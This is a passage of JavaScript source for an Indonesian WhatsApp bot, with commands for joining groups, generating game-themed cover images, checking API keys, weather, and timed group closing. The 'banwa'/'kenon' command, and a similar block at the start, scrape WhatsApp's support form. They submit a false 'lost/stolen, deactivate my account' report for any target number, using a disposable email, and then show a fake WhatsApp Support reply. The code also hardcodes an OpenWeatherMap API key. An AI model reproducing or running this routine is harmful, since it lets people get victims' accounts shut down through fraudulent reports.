form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
m.reply(`Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} catch (err) {reply(`${err}`)}
} else m.reply(`*Tɪᴅᴀᴋ ʙɪsᴀ ʀᴇsᴇᴛ-ᴏᴛᴘ ᴏᴡɴᴇʀ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴏᴡɴᴇʀ ʏᴀɴɢ ᴛᴇʟᴀʜ ᴍᴇɴᴄɪᴘᴛᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ !!!*`)
}
break
            case 'banwa': 
            case 'kenon': {
            if (isBan) return reply(mess.ban)
            if (!isCreator) return reply(mess.owner)
     if (!q) return m.reply(`@Tᴀɢ/Nᴏᴍᴏʀɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*⫹⫺ Cᴏɴᴛᴏʜ : ${prefix + command} @Tᴀɢ/62xxxx*`)
if (m.quoted || q) {
const froms = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')
var cekno = await tganz.onWhatsApp(froms)
if (cekno.length == 0) return m.reply(`@Tᴀɢ/Nᴏᴍᴏʀɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n*⫹⫺ Cᴏɴᴛᴏʜ : ${prefix + command} @Tᴀɢ/62xxxx*`)
if (froms === ownerNumber) return m.reply(`*Tɪᴅᴀᴋ ʙɪsᴀ ʙᴀɴɴᴇᴅ ᴏᴡɴᴇʀ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴏᴡɴᴇʀ ʏᴀɴɢ ᴛᴇʟᴀʜ ᴍᴇɴᴄɪᴘᴛᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ !!!*`)
var targetnya = froms.split('@')[0]
await tganz.sendMessage(m.chat, { react: { text: `📮`, key: m.key }})
try {
var axioss = require('axios')
var ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
var email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
var $ = cheerio.load(ntah.data)
var $form = $("form");
var url = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

var res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`FROM WhatsApp Support
Hai,
 Terima kasih atas pesan Anda.
 Kami telah menonaktifkan akun WhatsApp Anda.  Ini berarti akun Anda untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut.  Harap dicatat: Tim Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.
 Selama periode penonaktifan:
 • Kontak Anda di WhatsApp mungkin masih melihat nama dan gambar profil Anda. 
 • Setiap pesan yang mungkin dikirim oleh kontak Anda ke akun akan tetap dalam status tertunda hingga 30 hari.
 Jika Anda ingin mendapatkan kembali akun Anda, daftarkan ulang akun Anda sebagai secepatnya.  
 Daftar ulang akun Anda dengan memasukkan kode 6 digit, kode yang Anda terima melalui SMS atau panggilan telepon. Jika Anda mendaftar ulang
 pulihkan riwayat obrolan Anda di: Android |  iPhone.
 file, cadangan, atau riwayat panggilan dari akun yang dihapus.
 akun sebelum dihapus, Anda akan tetap berada di semua obrolan grup.  Anda akan memiliki opsi untuk memulihkan data Anda.  Pelajari caranya Jika Anda tidak mendaftarkan ulang akun Anda, akun tersebut mungkin akan dihapus dan proses ini tidak dapat dibatalkan.  Sayangnya, WhatsApp tidak dapat membantu Anda memulihkan obrolan, dokumen, media
 Catatan: Jika perangkat Anda hilang atau dicuri, sebaiknya hubungi penyedia seluler Anda untuk memblokir kartu SIM Anda sesegera mungkin.  Memblokir kartu SIM Anda mencegah orang lain mendaftar dan mengakses akun yang terkait dengan kartu SIM.
 Sumber daya terkait:
  Untuk informasi lebih lanjut tentang penonaktifan akun pada ponsel yang hilang dan dicuri, silakan baca artikel ini.
  Pelajari tentang akun yang dicuri di artikel ini.
 Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami.  Kami akan dengan senang hati membantu!`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else m.reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else m.reply(`*Tɪᴅᴀᴋ ʙɪsᴀ ʙᴀɴɴᴇᴅ ᴏᴡɴᴇʀ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴏᴡɴᴇʀ ʏᴀɴɢ ᴛᴇʟᴀʜ ᴍᴇɴᴄɪᴘᴛᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ !!!*`)
}
break
           case 'join': {
            if (isBan) return reply(mess.ban)
                if (!isCreator) return reply(mess.owner)
                if (!text) return reply(`⫹⫺ Mᴀsᴜᴋᴀɴ ʟɪɴᴋ ɢʀᴜᴘɴʏᴀ ᴋᴀᴋ !\n\n❑ Cᴏɴᴛᴏʜ :\n*${prefix + command} https://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz*`)
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('*Lɪɴᴋ ɢʀᴜᴘ ᴛɪᴅᴀᴋ ᴛᴇʀᴅᴀғᴛᴀʀ ᴀᴛᴀᴜ ʟɪɴᴋ sᴀʟᴀʜ, Sɪʟᴀʜᴋᴀɴ ᴍɪɴᴛᴀ ʟɪɴᴋ ɢʀᴜᴘ ᴘᴀᴅᴀ ᴀᴅᴍɪɴ ᴛᴇʀᴛᴇɴᴛᴜ !!!*')
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await tganz.groupAcceptInvite(result).then((res) => m.reply('*Sᴜᴋsᴇs ᴊᴏɪɴᴋᴀɴ ʙᴏᴛ ᴋᴇ ɢʀᴜᴘ ᴛᴇʀsᴇʙᴜᴛ. Dɪᴜᴛᴀᴍᴀᴋᴀɴ ᴛɪᴅᴀᴋ sᴘᴀᴍ ᴅᴀʟᴀᴍ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ʙᴏᴛ !!!*')).catch((err) => m.reply('*Gᴀɢᴀʟ ᴊᴏɪɴᴋᴀɴ ʙᴏᴛ ᴋᴇ ᴅᴀʟᴀᴍ ɢʀᴜᴘ ᴛᴇʀsᴇʙᴜᴛ ᴋᴀʀᴇɴᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴅᴀʟᴀᴍ ᴘʀᴏsᴇs ᴊᴏɪɴ ʙɪsᴀ ᴊᴀᴅɪ ʙᴏᴛ ʙᴀʀᴜ sᴀᴊᴀ ᴅɪ ᴋɪᴄᴋ ᴏʟᴇʜ ᴀᴅᴍɪɴ ɢʀᴜᴘ ᴛᴇʀsᴇʙᴜᴛ !!!*'))
           }
            break
            case 'coverfblol': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|letters\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|nami`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|letters\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|nami`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['yasuo', 'shen', 'riven', 'pantheon', 'orianna', 'nocturne', 'nami', 'norgana', 'naster-yi', 'lux', 'lucian', 'katarina', 'kalista', 'jinx', 'jhin', 'irelia', 'hecarim', 'graves', 'garen', 'fizz', 'fiora', 'ezreal', 'ekko', 'diana', 'darius', 'cassiopeia', 'caitlyn', 'braum', 'azir', 'ashe', 'warwick', 'thresh', 'leblanc', 'khazix', 'kayn', 'draven', 'zyra', 'zed', 'xayah', 'taric', 'talon', 'sona', 'sivir', 'rengar', 'rakan', 'leesin', 'gnar', 'elise']
                if (!style.includes(m2)) {
                    getStyle(style.length, "letters")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        letters: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'totalfitur':
            case 'totalf':
            case 'fitur': {
            if (isBan) return reply(mess.ban)
            let anu = ` ⌈ *Tᴏᴛᴀ - Fɪᴛᴜʀ* ⌋\n\n  *❑ Nᴀᴍᴀ Bᴏᴛ :* _${namabot}_\n  *❑ Jᴜᴍʟᴀʜ ғɪᴛᴜʀ ʙᴏᴛ :* _${totalFitur()} Fɪᴛᴜʀ_\n⊙═════════════════⊙\n ⫹ *Lɪɴᴋ Gʀᴏᴜᴘ Bᴏᴛ* ⫺\nhttps://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz\n⊙═════════════════⊙`
            tganz.sendMessage(m.chat, { image: thumb, caption: anu }, { qouted: fkontak })
            }
               break
               case 'cekapiz':
               case 'cekapikeyzenz': {
               if (isBan) return reply(mess.ban)
                if (!text) return reply(`*Mᴀsᴜᴋᴀɴ Aᴘɪᴋᴇʏɴʏᴀ ᴋᴀᴋᴀᴋ !*`)
          tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
        try {
            let fetch = await fetchUrl(global.api("zenz", "/user/cekapi", {apikey: text}))
            let caption = `⌈ *Iɴғᴏʀᴍᴀsɪ - Aᴘɪᴋᴇʏ* ⌋\n\n`
            let i = fetch.message
            caption += `⭔ *❑ ID :* ${i.id}\n`
            caption += `⭔ *❑ Cʀᴇᴀᴛᴇᴅ :* ${i.created}\n`
            caption += `⭔ *❑ Uᴘᴅᴀᴛᴇᴅ :* ${i.updated}\n`
            caption += `⭔ *❑ Fɪʀsᴛ Nᴀᴍᴇ :* ${i.firstname}\n`
            caption += `⭔ *❑ Lᴀsᴛ Nᴀᴍᴇ :* ${i.lastname}\n`
            caption += `⭔ *❑ Eᴍᴀɪʟ :* ${i.email}\n`
            caption += `⭔ *❑ Usᴇʀɴᴀᴍᴇ :* ${i.username}\n`
            caption += `⭔ *❑ Aᴘɪ-Kᴇʏ :* ${i.apiKey}\n`
            caption += `⭔ *❑ Hɪᴛ-Tᴏᴅᴀʏ :* ${i.today_hit}\n`
            caption += `⭔ *❑ Tᴏᴛᴀʟ-Hɪᴛ :* ${i.total_hit}\n`
            caption += `⭔ *❑ Sᴛᴀᴛᴜs :* ${i.status}\n`
            caption += `⭔ *❑ Pʀᴇᴍɪᴜᴍ :* ${i.premium}\n`
            caption += `⭔ *❑ Exᴘɪʀᴇᴅ :* ${i.premium_expired}\n`
            caption += `⭔ *❑ Aᴄᴛɪᴠᴇ :* ${i.active}\n`
            caption += `⭔ *❑ Lᴏᴄᴀᴛɪᴏɴ:* ${i.location}\n`
            caption += `⭔ *❑ Bɪᴏᴅᴀᴛᴀ:* ${i.biodata}\n\n`
            caption += `*⫹⫺ Bᴇʀɪᴋᴜᴛ ᴀᴅᴀʟᴀʜ ʜᴀsɪʟ ᴅᴀᴛᴀ ɪɴғᴏʀᴍᴀsɪ ᴅᴀʀɪ Aᴘɪᴋᴇʏ Zᴇɴᴢᴀᴘɪs !!!*`
     tganz.sendMessage(m.chat, { image: thumb, caption: caption }, { quoted: m })
        } catch (e) {
            m.reply('*Aᴘɪᴋᴇʏ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ/Tɪᴅᴀᴋ ᴛᴇʀᴅᴀғᴛᴀʀ !!!*')
        }
    }
     break
        case 'cekapilol':
        case 'cekapikeylol':
        case 'cekapikeylolhuman': {
           if (isBan) return reply(mess.ban)
          if (!text) return reply(`*Mᴀsᴜᴋᴀɴ Aᴘɪᴋᴇʏɴʏᴀ ᴋᴀᴋᴀᴋ !*`)
          tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
            let lol = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${text}`)
            m.reply(mess.wait)
            if (lol.message == 'success') {
      let ani = `⌈ *Iɴғᴏʀᴍᴀsɪ - Aᴘɪᴋᴇʏ* ⌋
      
⭔ *❑ Aᴘɪ-Kᴇʏ :*  ${text}
⭔ *❑ Usᴇʀɴᴀᴍᴇ :* ${lol.result.username}
⭔ *❑ Tᴏᴛᴀʟ-Hɪᴛ :* ${lol.result.requests}
⭔ *❑ Hɪᴛ-Tᴏᴅᴀʏ :* ${lol.result.today}
⭔ *❑ Sᴛᴀᴛᴜs :* ${lol.result.account_type}
⭔ *❑ Exᴘɪʀᴇᴅ :* ${lol.result.expired}

*⫹⫺ Bᴇʀɪᴋᴜᴛ ᴀᴅᴀʟᴀʜ ʜᴀsɪʟ ᴅᴀᴛᴀ ɪɴғᴏʀᴍᴀsɪ ᴅᴀʀɪ Aᴘɪᴋᴇʏ Lᴏʟʜᴜᴍᴀɴ !!!*`
     tganz.sendMessage(m.chat, { image: thumb, caption: ani }, { quoted: m })
        } else
          m.reply('*Aᴘɪᴋᴇʏ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ/Tɪᴅᴀᴋ ᴛᴇʀᴅᴀғᴛᴀʀ !!!*')
       }
            break
            case 'keadaancuaca':
            case 'cuaca':
            case 'weather': {
         if (isBan) return reply(mess.ban)
if (!q) return reply(`Mᴀᴜ ᴄᴇᴋ ᴄᴜᴀᴄᴀ ᴋᴏᴛᴀ ᴍᴀɴᴀ ᴋᴀᴋᴀᴋ ?\n*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Jᴀᴋᴀʀᴛᴀ*`)
let api_cuaca = '18d044eb8e1c06eaf7c5a27bb138694c'
let unit_cuaca = 'metric'
let nama_kota = q
let cuaca = await fetchJson(`http://api.openweathermap.org/data/2.5/weather?q=${nama_kota}&units=${unit_cuaca}&appid=${api_cuaca}`)
let text_cuaca =`    ⌈ *INFO - CUACA* ⌋
*❑ Lokasi :* ${cuaca.name + "," + cuaca.sys.country}
*❑ Longitude :* ${cuaca.coord.lon}
*❑ Latitude :* ${cuaca.coord.lat}
*❑ Suhu :* ${cuaca.main.temp + " C"}
*❑ Angin :* ${cuaca.wind.speed + " m/s"}
*❑ Kelembaban :* ${cuaca.main.humidity + "%"}
*❑ Cuaca :* ${cuaca.weather[0].main}
*❑ Keterangan :* ${cuaca.weather[0].description}
*❑ Udara :* ${cuaca.main.pressure + " HPa"}`
m.reply(text_cuaca)
}
break
            case 'overwatchcover': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|hero\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|zsymmetra`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|hero\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|zsymmetra`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['zwinston', 'zjunkrat', 'zwidowmaker', 'ztracer', 'ztorbjorn', 'zsymmetra', 'zsombra', 'zsoldier76', 'zroadhog', 'zreinhardt', 'zreaper', 'zpharah', 'zorisa', 'zmercy', 'zmei', 'zmccree', 'zlucio', 'zhanzo', 'zgenji', 'zenyatta', 'zdva', 'zbastion', 'zarya', 'zana', 'yzenyatta', 'yzarya', 'ywinston', 'ywidowmaker', 'ytracer', 'ytorbjorn', 'ysymmetra', 'ysombra', 'ysoldier76', 'yroadhog', 'yreinhardt', 'yreaper', 'ypharah', 'yorisa', 'ymercy', 'ymei', 'ymccree', 'ylucio', 'yjunkrat', 'yhanzo', 'ygenji', 'ydva', 'ybastion', 'yana', 'xzenyatta', 'xzarya', 'xwinston', 'xwidowmaker', 'xtracer', 'xtorbjorn', 'xsymmetra', 'xsombra', 'xsoldier76', 'xroadhog', 'xreinhardt', 'xreaper', 'xpharah', 'xorisa', 'xmercy', 'xmei', 'xmccree', 'xlucio', 'xjunkrat', 'xhanzo', 'xgenji', 'xdva', 'xbastion', 'xana', 'wzenyatta', 'wzarya', 'wtracer', 'wtorbjorn', 'wsymmetra', 'wsombra', 'wsoldier76', 'wroadhog', 'wreinhardt', 'wreaper', 'wpharah', 'worisa', 'wmercy', 'wmei', 'wmccree', 'wlucio', 'wjunkrat', 'winston', 'widowmaker', 'whanzo', 'wgenji', 'wdva', 'wbastion', 'wana', 'vzenyatta', 'vzarya', 'vwinston', 'vwidowmaker', 'vtracer', 'vtorbjorn', 'vsymmetra', 'vsombra', 'vsoldier76', 'vroadhog', 'vreinhardt', 'vreaper', 'vpharah', 'vorisa', 'vmercy', 'vmei', 'vmccree', 'vlucio', 'vjunkrat', 'vhanzo', 'vgenji', 'vdva', 'vbastion', 'vana', 'uzenyatta', 'uzarya', 'uwinston', 'uwidowmaker', 'utracer', 'utorbjorn', 'usymmetra', 'usombra', 'usoldier76', 'uroadhog', 'ureinhardt', 'ureaper', 'upharah', 'uorisa', 'umercy', 'umei', 'umccree', 'ulucio', 'ujunkrat', 'uhanzo', 'ugenji', 'udva', 'ubastion', 'uana', 'tzenyatta', 'tzarya', 'twinston', 'twidowmaker', 'tsymmetra', 'tsombra', 'tsoldier76', 'troadhog', 'treinhardt', 'treaper', 'tracer', 'tpharah', 'torisa', 'torbjorn', 'tmercy', 'tmei', 'tmccree', 'tlucio', 'tjunkrat', 'thanzo', 'tgenji', 'tdva', 'tbastion', 'tana', 'szenyatta', 'szarya', 'symmetra', 'swinston', 'swidowmaker', 'stracer', 'storbjorn', 'sroadhog', 'sreinhardt', 'sreaper', 'spharah', 'sorisa', 'sombra', 'soldier76', 'smercy', 'smei', 'smccree', 'slucio', 'sjunkrat', 'shanzo', 'sgenji', 'sdva', 'sbastion', 'sana', 'rzenyatta', 'rzarya', 'rwinston', 'rwidowmaker', 'rtracer', 'rtorbjorn', 'rsymmetra', 'rsombra', 'rsoldier76', 'rrmei', 'rpharah', 'rorisa', 'roadhog', 'rmercy', 'rmccree', 'rlucio', 'rjunkrat', 'rhanzo', 'rgenji', 'reinhardt', 'reaper', 'rdva', 'rbastion', 'rana', 'qzenyatta', 'qzarya', 'qwinston', 'qwidowmaker', 'qtracer', 'qtorbjorn', 'qsymmetra', 'qsombra', 'qsoldier76', 'qroadhog', 'qreinhardt', 'qreaper', 'qpharah', 'qorisa', 'qmercy', 'qmei', 'qmccree', 'qlucio', 'qjunkrat', 'qhanzo', 'qgenji', 'qdva', 'qbastion', 'qana', 'pzenyatta', 'pzarya', 'pwinston', 'pwidowmaker', 'ptracer', 'ptorbjorn', 'psymmetra', 'psombra', 'psoldier76', 'proadhog', 'preinhardt', 'preaper', 'porisa', 'pmercy', 'pmei', 'pmccree', 'plucio', 'pjunkrat', 'pharah', 'phanzo', 'pgenji', 'pdva', 'pbastion', 'pana', 'ozenyatta', 'ozarya', 'owinston', 'owidowmaker', 'otracer', 'otorbjorn', 'osymmetra', 'osombra', 'osoldier76', 'oroadhog', 'orisa', 'oreinhardt', 'oreaper', 'opharah', 'omercy', 'omei', 'omccree', 'olucio', 'ojunkrat', 'ohanzo', 'ogenji', 'odva', 'obastion', 'oana', 'nzenyatta', 'nzarya', 'nwinston', 'nwidowmaker', 'ntracer', 'ntorbjorn', 'nsymmetra', 'nsombra', 'nsoldier76', 'nroadhog', 'nreinhardt', 'nreaper', 'npharah', 'norisa', 'nmercy', 'nmei', 'nmccree', 'nlucio', 'njunkrat', 'nhanzo', 'ngenji', 'ndva', 'nbastion', 'nana', 'mzenyatta', 'mzarya', 'mwinston', 'mwidowmaker', 'mtracer', 'mtorbjorn', 'msymmetra', 'msombra', 'msoldier76', 'mroadhog', 'mreinhardt', 'mreaper', 'mpharah', 'morisa', 'mlucio', 'mjunkrat', 'mhanzo', 'mgenji', 'mercy', 'mei', 'mdva', 'mccree', 'mbastion', 'mana', 'lzenyatta', 'lzarya', 'lwinston', 'lwidowmaker', 'lucio', 'ltracer', 'ltorbjorn', 'lsymmetra', 'lsombra', 'lsoldier76', 'lroadhog', 'lreinhardt', 'lreaper', 'lpharah', 'lorisa', 'lmercy', 'lmei', 'lmccree', 'ljunkrat', 'lhanzo', 'lgenji', 'ldva', 'lbastion', 'lana', 'kzenyatta', 'kzarya', 'kwinston', 'kwidowmaker', 'ktracer', 'ktorbjorn', 'ksymmetra', 'ksombra', 'ksoldier76', 'kroadhog', 'kreinhardt', 'kreaper', 'kpharah', 'korisa', 'kmercy', 'kmei', 'kmccree', 'klucio', 'kjunkrat', 'khanzo', 'kgenji', 'kdva', 'kbastion', 'kana', 'jzenyatta', 'jzarya', 'jwinston', 'jwidowmaker', 'junkrat', 'jtracer', 'jtorbjorn', 'jsymmetra', 'jsombra', 'jsoldier76', 'jroadhog', 'jreinhardt', 'jreaper', 'jpharah', 'jorisa', 'jmercy', 'jmei', 'jmccree', 'jlucio', 'jhanzo', 'jgenji', 'jdva', 'jbastion', 'jana', 'izenyatta', 'izarya', 'iwinston', 'iwidowmaker', 'itracer', 'itorbjorn', 'isymmetra', 'isombra', 'isoldier76', 'iroadhog', 'ireinhardt', 'ireaper', 'ipharah', 'iorisa', 'imercy', 'imei', 'imccree', 'ilucio', 'ijunkrat', 'ihanzo', 'igenji', 'idva', 'ibastion', 'iana', 'hzenyatta', 'hzarya', 'hwinston', 'hwidowmaker', 'htracer', 'htorbjorn', 'hsymmetra', 'hsombra', 'hsoldier76', 'hroadhog', 'hreinhardt', 'hreaper', 'hpharah', 'horisa', 'hmercy', 'hmei', 'hmccree', 'hlucio', 'hjunkrat', 'hgenji', 'hdva', 'hbastion', 'hanzo', 'hana', 'gzenyatta', 'gzarya', 'gwinston', 'gwidowmaker', 'gtracer', 'gtorbjorn', 'gsymmetra', 'gsombra', 'gsoldier76', 'groadhog', 'greinhardt', 'greaper', 'gpharah', 'gorisa', 'gmercy', 'gmei', 'gmccree', 'glucio', 'gjunkrat', 'genji', 'gdva', 'gbastion', 'ganafzenyatta', 'fzarya', 'fwinston', 'fwidowmaker', 'ftracer', 'ftorbjorn', 'fsymmetra', 'fsombra', 'fsoldier76', 'froadhog', 'freinhardt', 'freaper', 'fpharah', 'forisa', 'fmercy', 'fmei', 'fmccree', 'flucio', 'fjunkrat', 'fhanzo', 'fgenji', 'fdva', 'fbastion', 'fana', 'ezenyatta', 'ezarya', 'ewinston', 'ewidowmaker', 'etracer', 'etorbjorn', 'esymmetra', 'esombra', 'esoldier76', 'eroadhog', 'ereinhardt', 'ereaper', 'epharah', 'eorisa', 'emercy', 'emei', 'emccree', 'elucio', 'ejunkrat', 'ehanzo', 'egenji', 'edva', 'ebastion', 'eana', 'dzenyatta', 'dzarya', 'dwinston', 'dwidowmaker', 'dva', 'dtracer', 'dtorbjorn', 'dsymmetra', 'dsombra', 'dsoldier76', 'droadhog', 'dreinhardt', 'dreaper', 'dpharah', 'dorisa', 'dmercy', 'dmei', 'dmccree', 'dlucio', 'djunkrat', 'dhanzo', 'dgenji', 'dbastion', 'dana', 'czenyatta', 'czarya', 'cwinston', 'cwidowmaker', 'ctracer', 'ctorbjorn', 'csymmetra', 'csombra', 'csoldier76', 'croadhog', 'creinhardt', 'creaper', 'cpharah', 'corisa', 'cmercy', 'cmei', 'cmccree', 'clucio', 'cjunkrat', 'chanzo', 'cgenji', 'cdva', 'cbastion', 'cana', 'bzenyatta', 'bzarya', 'bwinston', 'bwidowmaker', 'btracer', 'btorbjorn', 'bsymmetra', 'bsombra', 'bsoldier76', 'broadhog', 'breinhardt', 'breaper', 'bpharah', 'borisa', 'bmercy', 'bmei', 'bmccree', 'blucio', 'bjunkrat', 'bhanzo', 'bgenji', 'bdva', 'bastion', 'bana', 'azenyatta', 'azarya', 'awinston', 'awidowmaker', 'atracer', 'atorbjorn', 'asymmetra', 'asombra', 'asoldier76', 'aroadhog', 'areinhardt', 'areaper', 'apharah', 'aorisa', 'ana', 'amercy', 'amei', 'amccree', 'alucio', 'ajunkrat', 'ahanzo', 'agenji', 'adva', 'abastion', 'zdoomfist', 'ydoomfist', 'xdoomfist', 'wdoomfist', 'vdoomfist', 'udoomfist', 'tdoomfist', 'sdoomfist', 'rdoomfist', 'qdoomfist', 'pdoomfist', 'odoomfist', 'ndoomfist', 'mdoomfist', 'ldoomfist', 'kdoomfist', 'jdoomfist', 'idoomfist', 'hdoomfist', 'gdoomfist', 'fdoomfist', 'edoomfist', 'doomfist', 'cdoomfist', 'bdoomfist', 'adoomfist']
                if (!style.includes(m2)) {
                    getStyle(style.length, "hero")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        hero: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'timeclose':
            case 'closetime':
            case 'tutupwaktu':
            case 'waktututup': {
            if (isBan) return reply(mess.ban)
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return reply(`Mᴀᴜ ᴛᴜᴛᴜᴘ ᴏᴛᴏᴍᴀᴛɪs ?
*⫹⫺ Cᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} 1 Hᴀʀɪ*

╔══════⟨ *Iɴғᴏ Wᴀᴋᴛᴜ* ⟩══════❑
╠❑ *Dᴇᴛɪᴋ* = 1-60 Dᴇᴛɪᴋ
╠❑ *Mᴇɴɪᴛ* = 1-60 Mᴇɴɪᴛ
╠❑ *Jᴀᴍ* = 1-24 Jᴀᴍ
╠❑ *Hᴀʀɪ* = Bᴇʙᴀs
╚════════════════════❑

❑ *Pᴇɴɢɢᴜɴᴀᴀɴ ʙᴇʀʟᴀᴋᴜ ᴜɴᴛᴜᴋ Aᴅᴍɪɴ ᴅᴀɴ ᴛɪᴅᴀᴋ ʙᴇʀʟᴀᴋᴜ ᴜɴᴛᴜᴋ Mᴇᴍʙᴇʀ !!!!*`)
}
reply(`*Pᴇɴᴇʀᴀᴘᴀɴ ᴡᴀᴋᴛᴜ ᴛᴜᴛᴜᴘ ᴏᴛᴏᴍᴀᴛɪs sᴜᴅᴀʜ ᴅɪ ᴛᴇʀᴀᴘᴋᴀɴ !!!*

╔☞ ɢʀᴜᴘ ᴀᴋᴀɴ ᴅɪ ᴛᴜᴛᴜᴘ ᴏᴛᴏᴍᴀᴛɪs :
╠══════════════════❑
╠❑ *ᴡᴀᴋᴛᴜ ᴏᴛᴏᴍᴀᴛɪs* : ${q}
╚══════════════════❑`)
setTimeout(() => {
var nomor = m.participant
const close = `         ⫹⫺ *Oᴛᴏᴍᴀᴛɪs Tᴜᴛᴜᴘ* ⫹⫺

❑ _Gʀᴜᴘ ʙᴇʀʜᴀsɪʟ ᴅɪ ᴛᴜᴛᴜᴘ ᴏʟᴇʜ ʙᴏᴛ. Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ᴏᴛᴏᴍᴀᴛɪs ᴛᴜᴛᴜᴘ ʙᴇᴋᴇʀᴊᴀ ᴅᴇɴɢᴀɴ sᴇɴᴅɪʀɪɴʏᴀ. Sᴇᴍᴀɴɢᴀᴛ_ ^~^`
tganz.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
}
break
           case 'timeopen':
           case 'bukawaktu':
           case 'waktubuka':
           case 'opentime': {
            if (isBan) return reply(mess.ban)
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
